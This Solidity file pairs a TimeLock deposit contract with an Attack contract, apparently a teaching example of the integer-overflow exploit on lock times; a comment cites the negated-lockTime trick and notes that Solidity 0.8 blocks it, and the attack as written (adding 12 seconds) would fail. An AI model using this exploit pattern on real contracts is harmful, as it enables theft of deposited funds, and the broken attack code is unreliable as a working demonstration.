// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount} ("");
        require(sent, "failed to send ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }
    
    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(12
            // uint256(-timeLock.lockTime(address(this))) fixed it in solidity 0.8 and above
            );
        timeLock.withdraw();
    }
}